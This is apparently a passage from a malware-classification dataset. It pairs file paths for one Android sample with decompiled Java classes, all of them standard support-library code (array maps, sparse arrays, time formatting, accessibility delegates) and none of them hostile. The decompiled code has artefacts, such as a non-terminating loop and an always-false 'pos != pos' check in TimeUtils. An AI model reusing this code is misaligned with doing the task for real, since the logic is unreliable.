System.arraycopy(this.mArray,i3 << 1,this.mArray,(i3 + 1) << 1,(this.mSize - i3) << 1);     }     this.mHashes[i3]=hashCode;     this.mArray[i3 << 1]=k;     this.mArray[(i3 << 1) + 1]=v;     this.mSize++;     return null;   }   public void putAll(  SimpleArrayMap<? extends K,? extends V> array){     int N=array.mSize;     ensureCapacity(this.mSize + N);     if (this.mSize == 0) {       if (N > 0) {         System.arraycopy(array.mHashes,0,this.mHashes,0,N);         System.arraycopy(array.mArray,0,this.mArray,0,N << 1);         this.mSize=N;         return;       }       return;     }     for (int i=0; i < N; i++) {       put(array.keyAt(i),array.valueAt(i));     }   }   public V remove(  Object key){     int index=key == null ? indexOfNull() : indexOf(key,key.hashCode());     if (index >= 0) {       return removeAt(index);     }     return null;   }   public V removeAt(  int i){     V v=(V)this.mArray[(i << 1) + 1];     if (this.mSize <= 1) {       freeArrays(this.mHashes,this.mArray,this.mSize);       this.mHashes=ContainerHelpers.EMPTY_INTS;       this.mArray=ContainerHelpers.EMPTY_OBJECTS;       this.mSize=0;     }  else     if (this.mHashes.length > 8 && this.mSize < this.mHashes.length / 3) {       int i2=this.mSize > 8 ? this.mSize + (this.mSize >> 1) : 8;       int[] iArr=this.mHashes;       Object[] objArr=this.mArray;       allocArrays(i2);       this.mSize--;       if (i > 0) {         System.arraycopy(iArr,0,this.mHashes,0,i);         System.arraycopy(objArr,0,this.mArray,0,i << 1);       }       if (i < this.mSize) {         System.arraycopy(iArr,i + 1,this.mHashes,i,this.mSize - i);         System.arraycopy(objArr,(i + 1) << 1,this.mArray,i << 1,(this.mSize - i) << 1);       }     }  else {       this.mSize--;       if (i < this.mSize) {         System.arraycopy(this.mHashes,i + 1,this.mHashes,i,this.mSize - i);         System.arraycopy(this.mArray,(i + 1) << 1,this.mArray,i << 1,(this.mSize - i) << 1);       }       this.mArray[this.mSize << 1]=null;       this.mArray[(this.mSize << 1) + 1]=null;     }     return v;   }   public int size(){     return this.mSize;   }   public boolean equals(  Object object){     if (this == object) {       return true;     }     if (!(object instanceof Map)) {       return false;     }     Map<?,?> map=(Map)object;     if (size() != map.size()) {       return false;     }     for (int i=0; i < this.mSize; i++) {       try {         K key=keyAt(i);         V mine=valueAt(i);         Object theirs=map.get(key);         if (mine == null) {           if (theirs != null || !map.containsKey(key)) {             return false;           }         }  else         if (!mine.equals(theirs)) {           return false;         }       }  catch (      ClassCastException e) {         return false;       } catch (      NullPointerException e2) {         return false;       }     }     return true;   }   public int hashCode(){     int[] hashes=this.mHashes;     Object[] array=this.mArray;     int result=0;     int i=0;     int v=1;     int s=this.mSize;     while (i < s) {       Object value=array[v];       result+=(value == null ? 0 : value.hashCode()) ^ hashes[i];       i++;       v+=2;     }     return result;   }   public String toString(){     if (isEmpty()) {       return ""{}"";     }     StringBuilder buffer=new StringBuilder(this.mSize * 28);     buffer.append('{');     for (int i=0; i < this.mSize; i++) {       if (i > 0) {         buffer.append("", "");       }       Object key=keyAt(i);       if (key != this) {         buffer.append(key);       }  else {         buffer.append(""(this Map)"");       }       buffer.append('=');       Object value=valueAt(i);       if (value != this) {         buffer.append(value);       }  else {         buffer.append(""(this Map)"");       }     }     buffer.append('}');     return buffer.toString();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.util\SparseArrayCompat.code","public class SparseArrayCompat<E> implements Cloneable {   private static final Object DELETED=new Object();   private boolean mGarbage;   private int[] mKeys;   private int mSize;   private Object[] mValues;   public SparseArrayCompat(){     this(10);   }   public SparseArrayCompat(  int initialCapacity){     this.mGarbage=false;     if (initialCapacity == 0) {       this.mKeys=ContainerHelpers.EMPTY_INTS;       this.mValues=ContainerHelpers.EMPTY_OBJECTS;     }  else {       int initialCapacity2=ContainerHelpers.idealIntArraySize(initialCapacity);       this.mKeys=new int[initialCapacity2];       this.mValues=new Object[initialCapacity2];     }     this.mSize=0;   }   public SparseArrayCompat<E> m1clone(){     SparseArrayCompat<E> clone=null;     try {       clone=(SparseArrayCompat)super.clone();       clone.mKeys=(int[])this.mKeys.clone();       clone.mValues=(Object[])this.mValues.clone();       return clone;     }  catch (    CloneNotSupportedException e) {       return clone;     }   }   public E get(  int key){     return get(key,null);   }   public E get(  int i,  E e){     int binarySearch=ContainerHelpers.binarySearch(this.mKeys,this.mSize,i);     return (binarySearch < 0 || this.mValues[binarySearch] == DELETED) ? e : (E)this.mValues[binarySearch];   }   public void delete(  int key){     int i=ContainerHelpers.binarySearch(this.mKeys,this.mSize,key);     if (i >= 0 && this.mValues[i] != DELETED) {       this.mValues[i]=DELETED;       this.mGarbage=true;     }   }   public void remove(  int key){     delete(key);   }   public void removeAt(  int index){     if (this.mValues[index] != DELETED) {       this.mValues[index]=DELETED;       this.mGarbage=true;     }   }   public void removeAtRange(  int index,  int size){     int end=Math.min(this.mSize,index + size);     for (int i=index; i < end; i++) {       removeAt(i);     }   }   private void gc(){     int n=this.mSize;     int o=0;     int[] keys=this.mKeys;     Object[] values=this.mValues;     for (int i=0; i < n; i++) {       Object val=values[i];       if (val != DELETED) {         if (i != o) {           keys[o]=keys[i];           values[o]=val;           values[i]=null;         }         o++;       }     }     this.mGarbage=false;     this.mSize=o;   }   public void put(  int key,  E value){     int i=ContainerHelpers.binarySearch(this.mKeys,this.mSize,key);     if (i >= 0) {       this.mValues[i]=value;       return;     }     int i2=i ^ (-1);     if (i2 < this.mSize && this.mValues[i2] == DELETED) {       this.mKeys[i2]=key;       this.mValues[i2]=value;       return;     }     if (this.mGarbage && this.mSize >= this.mKeys.length) {       gc();       i2=ContainerHelpers.binarySearch(this.mKeys,this.mSize,key) ^ (-1);     }     if (this.mSize >= this.mKeys.length) {       int n=ContainerHelpers.idealIntArraySize(this.mSize + 1);       int[] nkeys=new int[n];       Object[] nvalues=new Object[n];       System.arraycopy(this.mKeys,0,nkeys,0,this.mKeys.length);       System.arraycopy(this.mValues,0,nvalues,0,this.mValues.length);       this.mKeys=nkeys;       this.mValues=nvalues;     }     if (this.mSize - i2 != 0) {       System.arraycopy(this.mKeys,i2,this.mKeys,i2 + 1,this.mSize - i2);       System.arraycopy(this.mValues,i2,this.mValues,i2 + 1,this.mSize - i2);     }     this.mKeys[i2]=key;     this.mValues[i2]=value;     this.mSize++;   }   public int size(){     if (this.mGarbage) {       gc();     }     return this.mSize;   }   public int keyAt(  int index){     if (this.mGarbage) {       gc();     }     return this.mKeys[index];   }   public E valueAt(  int i){     if (this.mGarbage) {       gc();     }     return (E)this.mValues[i];   }   public void setValueAt(  int index,  E value){     if (this.mGarbage) {       gc();     }     this.mValues[index]=value;   }   public int indexOfKey(  int key){     if (this.mGarbage) {       gc();     }     return ContainerHelpers.binarySearch(this.mKeys,this.mSize,key);   }   public int indexOfValue(  E value){     if (this.mGarbage) {       gc();     }     for (int i=0; i < this.mSize; i++) {       if (this.mValues[i] == value) {         return i;       }     }     return -1;   }   public void clear(){     int n=this.mSize;     Object[] values=this.mValues;     for (int i=0; i < n; i++) {       values[i]=null;     }     this.mSize=0;     this.mGarbage=false;   }   public void append(  int key,  E value){     if (this.mSize != 0 && key <= this.mKeys[this.mSize - 1]) {       put(key,value);       return;     }     if (this.mGarbage && this.mSize >= this.mKeys.length) {       gc();     }     int pos=this.mSize;     if (pos >= this.mKeys.length) {       int n=ContainerHelpers.idealIntArraySize(pos + 1);       int[] nkeys=new int[n];       Object[] nvalues=new Object[n];       System.arraycopy(this.mKeys,0,nkeys,0,this.mKeys.length);       System.arraycopy(this.mValues,0,nvalues,0,this.mValues.length);       this.mKeys=nkeys;       this.mValues=nvalues;     }     this.mKeys[pos]=key;     this.mValues[pos]=value;     this.mSize=pos + 1;   }   public String toString(){     if (size() <= 0) {       return ""{}"";     }     StringBuilder buffer=new StringBuilder(this.mSize * 28);     buffer.append('{');     for (int i=0; i < this.mSize; i++) {       if (i > 0) {         buffer.append("", "");       }       int key=keyAt(i);       buffer.append(key);       buffer.append('=');       Object value=valueAt(i);       if (value != this) {         buffer.append(value);       }  else {         buffer.append(""(this Map)"");       }     }     buffer.append('}');     return buffer.toString();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.util\TimeUtils.code","public class TimeUtils {   public static final int HUNDRED_DAY_FIELD_LEN=19;   private static final int SECONDS_PER_DAY=86400;   private static final int SECONDS_PER_HOUR=3600;   private static final int SECONDS_PER_MINUTE=60;   private static final Object sFormatSync=new Object();   private static char[] sFormatStr=new char[24];   private static int accumField(  int amt,  int suffix,  boolean always,  int zeropad){     if (amt > 99 || (always && zeropad >= 3)) {       return suffix + 3;     }     if (amt > 9 || (always && zeropad >= 2)) {       return suffix + 2;     }     if (always || amt > 0) {       return suffix + 1;     }     return 0;   }   private static int printField(  char[] formatStr,  int amt,  char suffix,  int pos,  boolean always,  int zeropad){     if (always || amt > 0) {       if ((always && zeropad >= 3) || amt > 99) {         int dig=amt / 100;         formatStr[pos]=(char)(dig + 48);         pos++;         amt-=dig * 100;       }       if ((always && zeropad >= 2) || amt > 9 || pos != pos) {         int dig2=amt / 10;         formatStr[pos]=(char)(dig2 + 48);         pos++;         amt-=dig2 * 10;       }       formatStr[pos]=(char)(amt + 48);       int pos2=pos + 1;       formatStr[pos2]=suffix;       return pos2 + 1;     }     return pos;   }   private static int formatDurationLocked(  long duration,  int fieldLen){     char prefix;     if (sFormatStr.length < fieldLen) {       sFormatStr=new char[fieldLen];     }     char[] formatStr=sFormatStr;     if (duration == 0) {       int fieldLen2=fieldLen - 1;       while (0 < fieldLen2) {         formatStr[0]=' ';       }       formatStr[0]='0';       return 1;     }     if (duration > 0) {       prefix='+';     }  else {       prefix='-';       duration=-duration;     }     int millis=(int)(duration % 1000);     int seconds=(int)Math.floor(duration / 1000);     int days=0;     int hours=0;     int minutes=0;     if (seconds > SECONDS_PER_DAY) {       days=seconds / SECONDS_PER_DAY;       seconds-=SECONDS_PER_DAY * days;     }     if (seconds > SECONDS_PER_HOUR) {       hours=seconds / SECONDS_PER_HOUR;       seconds-=hours * SECONDS_PER_HOUR;     }     if (seconds > SECONDS_PER_MINUTE) {       minutes=seconds / SECONDS_PER_MINUTE;       seconds-=minutes * SECONDS_PER_MINUTE;     }     int pos=0;     if (fieldLen != 0) {       int myLen=accumField(days,1,false,0);       int myLen2=myLen + accumField(hours,1,myLen > 0,2);       int myLen3=myLen2 + accumField(minutes,1,myLen2 > 0,2);       int myLen4=myLen3 + accumField(seconds,1,myLen3 > 0,2);       for (int myLen5=myLen4 + accumField(millis,2,true,myLen4 > 0 ? 3 : 0) + 1; myLen5 < fieldLen; myLen5++) {         formatStr[pos]=' ';         pos++;       }     }     formatStr[pos]=prefix;     int pos2=pos + 1;     boolean zeropad=fieldLen != 0;     int pos3=printField(formatStr,days,'d',pos2,false,0);     int pos4=printField(formatStr,hours,'h',pos3,pos3 != pos2,zeropad ? 2 : 0);     int pos5=printField(formatStr,minutes,'m',pos4,pos4 != pos2,zeropad ? 2 : 0);     int pos6=printField(formatStr,seconds,'s',pos5,pos5 != pos2,zeropad ? 2 : 0);     int pos7=printField(formatStr,millis,'m',pos6,true,(!zeropad || pos6 == pos2) ? 0 : 3);     formatStr[pos7]='s';     return pos7 + 1;   }   public static void formatDuration(  long duration,  StringBuilder builder){ synchronized (sFormatSync) {       int len=formatDurationLocked(duration,0);       builder.append(sFormatStr,0,len);     }   }   public static void formatDuration(  long duration,  PrintWriter pw,  int fieldLen){ synchronized (sFormatSync) {       int len=formatDurationLocked(duration,fieldLen);       pw.print(new String(sFormatStr,0,len));     }   }   public static void formatDuration(  long duration,  PrintWriter pw){     formatDuration(duration,pw,0);   }   public static void formatDuration(  long time,  long now,  PrintWriter pw){     if (time == 0) {       pw.print(""--"");     }  else {       formatDuration(time - now,pw,0);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.util\ValuesCollection.code","final class ValuesCollection implements Collection<V> {   ValuesCollection(){   }   @Override public boolean add(  V object){     throw new UnsupportedOperationException();   }   @Override public boolean addAll(  Collection<? extends V> collection){     throw new UnsupportedOperationException();   }   @Override public void clear(){     MapCollections.this.colClear();   }   @Override public boolean contains(  Object object){     return MapCollections.this.colIndexOfValue(object) >= 0;   }   @Override public boolean containsAll(  Collection<?> collection){     Iterator<?> it=collection.iterator();     while (it.hasNext()) {       if (!contains(it.next())) {         return false;       }     }     return true;   }   @Override public boolean isEmpty(){     return MapCollections.this.colGetSize() == 0;   }   @Override public Iterator<V> iterator(){     return new ArrayIterator(1);   }   @Override public boolean remove(  Object object){     int index=MapCollections.this.colIndexOfValue(object);     if (index < 0) {       return false;     }     MapCollections.this.colRemoveAt(index);     return true;   }   @Override public boolean removeAll(  Collection<?> collection){     int N=MapCollections.this.colGetSize();     boolean changed=false;     int i=0;     while (i < N) {       Object cur=MapCollections.this.colGetEntry(i,1);       if (collection.contains(cur)) {         MapCollections.this.colRemoveAt(i);         i--;         N--;         changed=true;       }       i++;     }     return changed;   }   @Override public boolean retainAll(  Collection<?> collection){     int N=MapCollections.this.colGetSize();     boolean changed=false;     int i=0;     while (i < N) {       Object cur=MapCollections.this.colGetEntry(i,1);       if (!collection.contains(cur)) {         MapCollections.this.colRemoveAt(i);         i--;         N--;         changed=true;       }       i++;     }     return changed;   }   @Override public int size(){     return MapCollections.this.colGetSize();   }   @Override public Object[] toArray(){     return MapCollections.this.toArrayHelper(1);   }   @Override public <T>T[] toArray(  T[] tArr){     return (T[])MapCollections.this.toArrayHelper(tArr,1);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\AccessibilityDelegateBridge.code","public interface AccessibilityDelegateBridge {   boolean dispatchPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   void onInitializeAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   void onInitializeAccessibilityNodeInfo(  View view,  Object obj);   void onPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   boolean onRequestSendAccessibilityEvent(  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent);   void sendAccessibilityEvent(  View view,  int i);   void sendAccessibilityEventUnchecked(  View view,  AccessibilityEvent accessibilityEvent); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\AccessibilityDelegateBridgeJellyBean.code","public interface AccessibilityDelegateBridgeJellyBean {   boolean dispatchPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   Object getAccessibilityNodeProvider(  View view);   void onInitializeAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   void onInitializeAccessibilityNodeInfo(  View view,  Object obj);   void onPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   boolean onRequestSendAccessibilityEvent(  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent);   boolean performAccessibilityAction(  View view,  int i,  Bundle bundle);   void sendAccessibilityEvent(  View view,  int i);   void sendAccessibilityEventUnchecked(  View view,  AccessibilityEvent accessibilityEvent); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\AccessibilityDelegateCompat.code","public class AccessibilityDelegateCompat {   private static final Object DEFAULT_DELEGATE;   private static final AccessibilityDelegateImpl IMPL;   final Object mBridge=IMPL.newAccessiblityDelegateBridge(this); public interface AccessibilityDelegateImpl {     boolean dispatchPopulateAccessibilityEvent(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);     AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    Object obj,    View view);     Object newAccessiblityDelegateBridge(    AccessibilityDelegateCompat accessibilityDelegateCompat);     Object newAccessiblityDelegateDefaultImpl();     void onInitializeAccessibilityEvent(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);     void onInitializeAccessibilityNodeInfo(    Object obj,    View view,    AccessibilityNodeInfoCompat accessibilityNodeInfoCompat);     void onPopulateAccessibilityEvent(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);     boolean onRequestSendAccessibilityEvent(    Object obj,    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent);     boolean performAccessibilityAction(    Object obj,    View view,    int i,    Bundle bundle);     void sendAccessibilityEvent(    Object obj,    View view,    int i);     void sendAccessibilityEventUnchecked(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);   } static class AccessibilityDelegateStubImpl implements AccessibilityDelegateImpl {     AccessibilityDelegateStubImpl(){     }     @Override public Object newAccessiblityDelegateDefaultImpl(){       return null;     }     @Override public Object newAccessiblityDelegateBridge(    AccessibilityDelegateCompat listener){       return null;     }     @Override public boolean dispatchPopulateAccessibilityEvent(    Object delegate,    View host,    AccessibilityEvent event){       return false;     }     @Override public void onInitializeAccessibilityEvent(    Object delegate,    View host,    AccessibilityEvent event){     }     @Override public void onInitializeAccessibilityNodeInfo(    Object delegate,    View host,    AccessibilityNodeInfoCompat info){     }     @Override public void onPopulateAccessibilityEvent(    Object delegate,    View host,    AccessibilityEvent event){     }     @Override public boolean onRequestSendAccessibilityEvent(    Object delegate,    ViewGroup host,    View child,    AccessibilityEvent event){       return true;     }     @Override public void sendAccessibilityEvent(    Object delegate,    View host,    int eventType){     }     @Override public void sendAccessibilityEventUnchecked(    Object delegate,    View host,    AccessibilityEvent event){     }     @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    Object delegate,    View host){       return null;     }     @Override public boolean performAccessibilityAction(    Object delegate,    View host,    int action,    Bundle args){       return false;     }   } static class AccessibilityDelegateIcsImpl extends AccessibilityDelegateStubImpl {     AccessibilityDelegateIcsImpl(){     }     @Override public Object newAccessiblityDelegateDefaultImpl(){       return AccessibilityDelegateCompatIcs.newAccessibilityDelegateDefaultImpl();     }     @Override public Object newAccessiblityDelegateBridge(    final AccessibilityDelegateCompat compat){       return AccessibilityDelegateCompatIcs.newAccessibilityDelegateBridge(new AccessibilityDelegateCompatIcs.AccessibilityDelegateBridge(){         @Override public boolean dispatchPopulateAccessibilityEvent(        View host,        AccessibilityEvent event){           return compat.dispatchPopulateAccessibilityEvent(host,event);         }         @Override public void onInitializeAccessibilityEvent(        View host,        AccessibilityEvent event){           compat.onInitializeAccessibilityEvent(host,event);         }         @Override public void onInitializeAccessibilityNodeInfo(        View host,        Object info){           compat.onInitializeAccessibilityNodeInfo(host,new AccessibilityNodeInfoCompat(info));         }         @Override public void onPopulateAccessibilityEvent(        View host,        AccessibilityEvent event){           compat.onPopulateAccessibilityEvent(host,event);         }         @Override public boolean onRequestSendAccessibilityEvent(        ViewGroup host,        View child,        AccessibilityEvent event){           return compat.onRequestSendAccessibilityEvent(host,child,event);         }         @Override public void sendAccessibilityEvent(        View host,        int eventType){           compat.sendAccessibilityEvent(host,eventType);         }         @Override public void sendAccessibilityEventUnchecked(        View host,        AccessibilityEvent event){           compat.sendAccessibilityEventUnchecked(host,event);         }       } );     }     @Override public boolean dispatchPopulateAccessibilityEvent(    Object delegate,    View host,    AccessibilityEvent event){       return AccessibilityDelegateCompatIcs.dispatchPopulateAccessibilityEvent(delegate,host,event);     }     @Override public void onInitializeAccessibilityEvent(    Object delegate,    View host,    AccessibilityEvent event){       AccessibilityDelegateCompatIcs.onInitializeAccessibilityEvent(delegate,host,event);     }     @Override public void onInitializeAccessibilityNodeInfo(    Object delegate,    View host,    AccessibilityNodeInfoCompat info){       AccessibilityDelegateCompatIcs.onInitializeAccessibilityNodeInfo(delegate,host,info.getInfo());     }     @Override public void onPopulateAccessibilityEvent(    Object delegate,    View host,    AccessibilityEvent event){       AccessibilityDelegateCompatIcs.onPopulateAccessibilityEvent(delegate,host,event);     }     @Override public boolean onRequestSendAccessibilityEvent(    Object delegate,    ViewGroup host,    View child,    AccessibilityEvent event){       return AccessibilityDelegateCompatIcs.onRequestSendAccessibilityEvent(delegate,host,child,event);     }     @Override public void sendAccessibilityEvent(    Object delegate,    View host,    int eventType){       AccessibilityDelegateCompatIcs.sendAccessibilityEvent(delegate,host,eventType);     }     @Override public void sendAccessibilityEventUnchecked(    Object delegate,    View host,    AccessibilityEvent event){       AccessibilityDelegateCompatIcs.sendAccessibilityEventUnchecked(delegate,host,event);     }   } static class AccessibilityDelegateJellyBeanImpl extends AccessibilityDelegateIcsImpl {     AccessibilityDelegateJellyBeanImpl(){     }     @Override public Object newAccessiblityDelegateBridge(    final AccessibilityDelegateCompat compat){       return AccessibilityDelegateCompatJellyBean.newAccessibilityDelegateBridge(new AccessibilityDelegateCompatJellyBean.AccessibilityDelegateBridgeJellyBean(){         @Override public boolean dispatchPopulateAccessibilityEvent(        View host,        AccessibilityEvent event){           return compat.dispatchPopulateAccessibilityEvent(host,event);         }         @Override public void onInitializeAccessibilityEvent(        View host,        AccessibilityEvent event){           compat.onInitializeAccessibilityEvent(host,event);         }         @Override public void onInitializeAccessibilityNodeInfo(        View host,        Object info){           compat.onInitializeAccessibilityNodeInfo(host,new AccessibilityNodeInfoCompat(info));         }         @Override public void onPopulateAccessibilityEvent(        View host,        AccessibilityEvent event){           compat.onPopulateAccessibilityEvent(host,event);         }         @Override public boolean onRequestSendAccessibilityEvent(        ViewGroup host,        View child,        AccessibilityEvent event){           return compat.onRequestSendAccessibilityEvent(host,child,event);         }         @Override public void sendAccessibilityEvent(        View host,        int eventType){           compat.sendAccessibilityEvent(host,eventType);         }         @Override public void sendAccessibilityEventUnchecked(        View host,        AccessibilityEvent event){           compat.sendAccessibilityEventUnchecked(host,event);         }         @Override public Object getAccessibilityNodeProvider(        View host){           AccessibilityNodeProviderCompat provider=compat.getAccessibilityNodeProvider(host);           if (provider != null) {             return provider.getProvider();           }           return null;         }         @Override public boolean performAccessibilityAction(        View host,        int action,        Bundle args){           return compat.performAccessibilityAction(host,action,args);         }       } );     }     @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    Object delegate,    View host){       Object provider=AccessibilityDelegateCompatJellyBean.getAccessibilityNodeProvider(delegate,host);       if (provider != null) {         return new AccessibilityNodeProviderCompat(provider);       }       return null;     }     @Override public boolean performAccessibilityAction(    Object delegate,    View host,    int action,    Bundle args){       return AccessibilityDelegateCompatJellyBean.performAccessibilityAction(delegate,host,action,args);     }   } static {     if (Build.VERSION.SDK_INT >= 16) {       IMPL=new AccessibilityDelegateJellyBeanImpl();     }  else     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new AccessibilityDelegateIcsImpl();     }  else {       IMPL=new AccessibilityDelegateStubImpl();     }     DEFAULT_DELEGATE=IMPL.newAccessiblityDelegateDefaultImpl();   }   public Object getBridge(){     return this.mBridge;   }   public void sendAccessibilityEvent(  View host,  int eventType){     IMPL.sendAccessibilityEvent(DEFAULT_DELEGATE,host,eventType);   }   public void sendAccessibilityEventUnchecked(  View host,  AccessibilityEvent event){     IMPL.sendAccessibilityEventUnchecked(DEFAULT_DELEGATE,host,event);   }   public boolean dispatchPopulateAccessibilityEvent(  View host,  AccessibilityEvent event){     return IMPL.dispatchPopulateAccessibilityEvent(DEFAULT_DELEGATE,host,event);   }   public void onPopulateAccessibilityEvent(  View host,  AccessibilityEvent event){     IMPL.onPopulateAccessibilityEvent(DEFAULT_DELEGATE,host,event);   }   public void onInitializeAccessibilityEvent(  View host,  AccessibilityEvent event){     IMPL.onInitializeAccessibilityEvent(DEFAULT_DELEGATE,host,event);   }   public void onInitializeAccessibilityNodeInfo(  View host,  AccessibilityNodeInfoCompat info){     IMPL.onInitializeAccessibilityNodeInfo(DEFAULT_DELEGATE,host,info);   }   public boolean onRequestSendAccessibilityEvent(  ViewGroup host,  View child,  AccessibilityEvent event){     return IMPL.onRequestSendAccessibilityEvent(DEFAULT_DELEGATE,host,child,event);   }   public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  View host){     return IMPL.getAccessibilityNodeProvider(DEFAULT_DELEGATE,host);   }   public boolean performAccessibilityAction(  View host,  int action,  Bundle args){     return IMPL.performAccessibilityAction(DEFAULT_DELEGATE,host,action,args);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\AccessibilityDelegateCompatIcs.code","class AccessibilityDelegateCompatIcs { public interface AccessibilityDelegateBridge {     boolean dispatchPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     void onInitializeAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     void onInitializeAccessibilityNodeInfo(    View view,    Object obj);     void onPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     boolean onRequestSendAccessibilityEvent(    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent);     void sendAccessibilityEvent(    View view,    int i);     void sendAccessibilityEventUnchecked(    View view,    AccessibilityEvent accessibilityEvent);   }   AccessibilityDelegateCompatIcs(){   }   public static Object newAccessibilityDelegateDefaultImpl(){     return new View.AccessibilityDelegate();   }   public static Object newAccessibilityDelegateBridge(  final AccessibilityDelegateBridge bridge){     return new View.AccessibilityDelegate(){       @Override public boolean dispatchPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         return AccessibilityDelegateBridge.this.dispatchPopulateAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityEvent(      View host,      AccessibilityEvent event){         AccessibilityDelegateBridge.this.onInitializeAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityNodeInfo(      View host,      AccessibilityNodeInfo info){         AccessibilityDelegateBridge.this.onInitializeAccessibilityNodeInfo(host,info);       }       @Override public void onPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         AccessibilityDelegateBridge.this.onPopulateAccessibilityEvent(host,event);       }       @Override public boolean onRequestSendAccessibilityEvent(      ViewGroup host,      View child,      AccessibilityEvent event){         return AccessibilityDelegateBridge.this.onRequestSendAccessibilityEvent(host,child,event);       }       @Override public void sendAccessibilityEvent(      View host,      int eventType){         AccessibilityDelegateBridge.this.sendAccessibilityEvent(host,eventType);       }       @Override public void sendAccessibilityEventUnchecked(      View host,      AccessibilityEvent event){         AccessibilityDelegateBridge.this.sendAccessibilityEventUnchecked(host,event);       }     } ;   }   public static boolean dispatchPopulateAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     return ((View.AccessibilityDelegate)delegate).dispatchPopulateAccessibilityEvent(host,event);   }   public static void onInitializeAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     ((View.AccessibilityDelegate)delegate).onInitializeAccessibilityEvent(host,event);   }   public static void onInitializeAccessibilityNodeInfo(  Object delegate,  View host,  Object info){     ((View.AccessibilityDelegate)delegate).onInitializeAccessibilityNodeInfo(host,(AccessibilityNodeInfo)info);   }   public static void onPopulateAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     ((View.AccessibilityDelegate)delegate).onPopulateAccessibilityEvent(host,event);   }   public static boolean onRequestSendAccessibilityEvent(  Object delegate,  ViewGroup host,  View child,  AccessibilityEvent event){     return ((View.AccessibilityDelegate)delegate).onRequestSendAccessibilityEvent(host,child,event);   }   public static void sendAccessibilityEvent(  Object delegate,  View host,  int eventType){     ((View.AccessibilityDelegate)delegate).sendAccessibilityEvent(host,eventType);   }   public static void sendAccessibilityEventUnchecked(  Object delegate,  View host,  AccessibilityEvent event){     ((View.AccessibilityDelegate)delegate).sendAccessibilityEventUnchecked(host,event);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\AccessibilityDelegateCompatJellyBean.code","class AccessibilityDelegateCompatJellyBean { public interface AccessibilityDelegateBridgeJellyBean {     boolean dispatchPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     Object getAccessibilityNodeProvider(    View view);     void onInitializeAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     void onInitializeAccessibilityNodeInfo(    View view,    Object obj);     void onPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     boolean onRequestSendAccessibilityEvent(    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent);     boolean performAccessibilityAction(    View view,    int i,    Bundle bundle);     void sendAccessibilityEvent(    View view,    int i);     void sendAccessibilityEventUnchecked(    View view,    AccessibilityEvent accessibilityEvent);   }   AccessibilityDelegateCompatJellyBean(){   }   public static Object newAccessibilityDelegateBridge(  final AccessibilityDelegateBridgeJellyBean bridge){     return new View.AccessibilityDelegate(){       @Override public boolean dispatchPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         return AccessibilityDelegateBridgeJellyBean.this.dispatchPopulateAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityEvent(      View host,      AccessibilityEvent event){         AccessibilityDelegateBridgeJellyBean.this.onInitializeAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityNodeInfo(      View host,      AccessibilityNodeInfo info){         AccessibilityDelegateBridgeJellyBean.this.onInitializeAccessibilityNodeInfo(host,info);       }       @Override public void onPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         AccessibilityDelegateBridgeJellyBean.this.onPopulateAccessibilityEvent(host,event);       }       @Override public boolean onRequestSendAccessibilityEvent(      ViewGroup host,      View child,      AccessibilityEvent event){         return AccessibilityDelegateBridgeJellyBean.this.onRequestSendAccessibilityEvent(host,child,event);       }       @Override public void sendAccessibilityEvent(      View host,      int eventType){         AccessibilityDelegateBridgeJellyBean.this.sendAccessibilityEvent(host,eventType);       }       @Override public void 